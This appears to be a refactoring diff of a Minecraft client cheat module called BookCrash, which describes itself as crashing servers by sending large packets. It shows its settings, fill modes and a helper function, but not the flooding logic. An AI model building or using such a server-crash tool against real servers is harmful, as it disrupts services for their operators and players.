@@ -15,24 +15,27 @@ import net.minecraft.network.play.client.CPacketCreativeInventoryAction
 import java.util.*
 import java.util.stream.Collectors
 
-/**
- * Created by d1gress/Qther on 25/11/2019.
- * Updated by d1gress/Qther on 26/11/2019.
- * Updated by Xiaro on 09/09/20
- */
 @Module.Info(
         name = "BookCrash",
         category = Module.Category.MISC,
         description = "Crashes servers by sending large packets"
 )
-class BookCrash : Module() {
+object BookCrash : Module() {
     private val mode = register(Settings.e<Mode>("Mode", Mode.RAION))
     private val fillMode = register(Settings.e<FillMode>("FillMode", FillMode.RANDOM))
     private val uses = register(Settings.integerBuilder("Uses").withValue(5).withMinimum(0))
     private val delay = register(Settings.integerBuilder("Delay").withValue(0).withRange(0, 40))
     private val pages = register(Settings.integerBuilder("Pages").withValue(50).withRange(1, 100))
 
-    private var timer = TimerUtils.TickTimer(TimerUtils.TimeUnit.TICKS)
+    private enum class Mode {
+        JESSICA, RAION
+    }
+
+    private enum class FillMode {
+        ASCII, FFFF, RANDOM, OLD
+    }
+
+    private val timer = TimerUtils.TickTimer(TimerUtils.TimeUnit.TICKS)
 
     override fun onUpdate() {
         if (mc.currentServerData == null || mc.currentServerData.serverIP.isEmpty() || mc.connection == null) {
@@ -88,13 +91,5 @@ class BookCrash : Module() {
 
     private fun repeat(count: Int, with: String): String {
         return String(CharArray(count)).replace("\u0000", with)
-    }
-
-    private enum class Mode {
-        JESSICA, RAION
-    }
-
-    private enum class FillMode {
-        ASCII, FFFF, RANDOM, OLD
     }
 }
